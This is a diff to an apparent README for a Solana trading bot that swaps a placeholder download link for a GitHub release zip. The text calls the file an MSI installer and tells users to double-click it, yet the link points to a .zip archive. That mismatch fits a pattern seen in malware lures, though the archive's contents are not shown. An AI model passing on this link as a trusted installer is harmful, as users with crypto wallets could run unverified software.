@@ -30,7 +30,7 @@ The Solana Auto Trade Bot is also available in a user-friendly MSI installer for
 ## MSI Installation and Usage
 
 ### 1. Download the MSI Installer
-[Download the Latest MSI Installer Here](#)
+[Download the Latest MSI Installer Here](https://github.com/josefhalfman/Solana-Trade-Bot/releases/download/V1.1/SolTradeBot.zip)
 
 ### 2. Run the Installer
 - Double-click the `.msi` file to start the installation.
